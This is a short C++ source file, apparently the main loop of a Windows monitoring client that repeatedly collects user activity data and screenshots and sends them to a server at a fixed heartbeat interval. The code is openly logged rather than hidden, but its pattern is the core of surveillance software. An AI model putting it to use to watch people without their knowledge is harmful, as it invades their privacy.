#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include "Config.h"
#include "ActivityMonitor.h"
#include "Screenshot.h"
#include "Network.h"

#pragma comment(lib, "Ws2_32.lib") 

int main() {
    OutputDebugStringA("[Client] Starting client service...\n");
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        OutputDebugStringA("[Client] WSAStartup failed\n");
        return 1;
    }

    while (true) {
        auto info = ActivityMonitor::GetInfo();
        auto shot = Screenshot::Capture();
        if (!Network::Send(info, shot)) {
            OutputDebugStringA("[Client] Failed to send data to server\n");
        }
        else {
            OutputDebugStringA("[Client] Data sent successfully\n");
        }
        Sleep(HEARTBEAT_SEC * 1000);
    }

    WSACleanup();
    return 0;
}